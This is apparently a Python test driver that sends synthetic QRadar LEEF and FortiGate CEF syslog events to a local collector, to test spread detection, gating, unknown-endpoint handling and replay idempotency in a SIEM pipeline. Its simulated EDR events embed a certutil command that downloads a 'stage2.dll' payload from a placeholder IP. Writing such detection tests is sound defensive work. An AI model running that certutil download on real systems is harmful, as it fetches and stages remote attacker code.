"""P1.10a proof driver — spread evidence over the REAL live syslog path.

Four tracks, all emitted as real CEF/LEEF on UDP 5514.  Nothing is
inserted directly into Mongo.

  TRACK A · the gate QUALIFIES it because the indicator spread
      A1  HYD-SRV31 · certutil + hash H1 · detection match, LOW severity
          -> score below the gate -> NO incident, indicator enrolled
      A2  HYD-SRV32 · same hash H1, same tooling, different endpoint
          -> 2nd distinct real endpoint -> SPREAD_CONFIRMED
          -> ICE evidence -> VEEE re-evaluates -> INCIDENT PROMOTED

  TRACK B · the gate REFUSES it even with spread evidence
      B1  HYD-FW05 · pure network event, single indicator (dest_ip)
      B2  HYD-FW06 · same dest_ip, 2nd real endpoint
          -> SPREAD_CONFIRMED -> ICE evidence -> VEEE re-evaluates
          -> still below the gate -> NO incident, remains evidence

  TRACK C · UNKNOWN endpoint identity
      C1  no dvchost / dhost / identHostName at all, same dest_ip
          -> sighting RETAINED, endpoint_count UNCHANGED, no spread

  TRACK D · idempotency
      D1  byte-identical replay of B2
          -> duplicate sighting ignored, no endpoint inflation,
             no second spread evidence at the same threshold

    python3 /app/scripts/p1_10a_spread_proof.py [host] [port]
"""
import socket
import sys
import time

H1 = "3f8c1d0b47a25e6f9081726354a6b7c8d9e0f1122334455667788990aabbccdd"

CERTUTIL = ("certutil.exe -urlcache -split -f "
            "http://198.51.100.7/stage2.dll")

# ── TRACK A ──────────────────────────────────────────────────────
A1 = (
    "<134>Jun 11 09:14:02 srv31 LEEF:2.0|IBM|QRadar EDR|3.1|4711|x09|"
    "cat=process\tdevTime=1780560842000\tsrc=10.4.9.31\tdst=198.51.100.7\t"
    "srcPort=44210\tdstPort=8443\tproto=TCP\tusrName=svc_backup\t"
    "identHostName=HYD-SRV31\tprocessName=certutil.exe\t"
    f"cmd={CERTUTIL}\tfileHash={H1}\tsev=2"
)
A2 = (
    "<134>Jun 11 09:19:47 srv32 LEEF:2.0|IBM|QRadar EDR|3.1|4711|x09|"
    "cat=process\tdevTime=1780561187000\tsrc=10.4.9.32\tdst=203.0.113.9\t"
    "srcPort=44988\tdstPort=8443\tproto=TCP\tusrName=svc_report\t"
    "identHostName=HYD-SRV32\tprocessName=certutil.exe\t"
    f"cmd={CERTUTIL}\tfileHash={H1}\tsev=2"
)

# ── TRACK B ──────────────────────────────────────────────────────
# No process, no hash, no command line -> dest_ip is the ONLY indicator,
# so exactly one spread evidence record can ever be emitted here.
B1 = (
    "<14>Jun 11 09:22:10 fw05 CEF:0|Fortinet|FortiGate|7.4|0100032002|"
    "outbound session to flagged host|8|src=10.7.1.44 spt=51001 "
    "dst=203.0.113.77 dpt=443 proto=TCP dvchost=HYD-FW05 duser=n.iyer "
    "act=accept"
)
B2 = (
    "<14>Jun 11 09:26:38 fw06 CEF:0|Fortinet|FortiGate|7.4|0100032002|"
    "outbound session to flagged host|8|src=10.9.2.61 spt=52440 "
    "dst=203.0.113.77 dpt=443 proto=TCP dvchost=HYD-FW06 duser=p.rao "
    "act=accept"
)

# ── TRACK C · no endpoint identity anywhere in the payload ───────
C1 = (
    "<14>Jun 11 09:31:05 relay CEF:0|Fortinet|FortiGate|7.4|0100032002|"
    "outbound session to flagged host|8|src=10.11.4.8 spt=53880 "
    "dst=203.0.113.77 dpt=443 proto=TCP duser=unknown act=accept"
)

EVENTS = [
    ("A1 · LEEF · HYD-SRV31 · certutil + hash H1 · expect NO incident", A1),
    ("A2 · LEEF · HYD-SRV32 · same hash, 2nd endpoint · expect INCIDENT", A2),
    ("B1 · CEF  · HYD-FW05  · dest_ip only · expect NO incident", B1),
    ("B2 · CEF  · HYD-FW06  · same dest_ip, 2nd endpoint · expect NO incident", B2),
    ("C1 · CEF  · NO hostname · same dest_ip · expect UNKNOWN, no spread", C1),
    ("D1 · CEF  · byte-identical replay of B2 · expect duplicate ignored", B2),
]


def main() -> None:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5514
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for label, line in EVENTS:
        sock.sendto(line.encode(), (host, port))
        print(f"sent -> {label}")
        # The collector batches every 2s; space the sends so each event
        # lands in its own batch and the ordering of the proof is real.
        time.sleep(3.0)
    print(f"\n{len(EVENTS)} events emitted to {host}:{port}/udp")


if __name__ == "__main__":
    main()
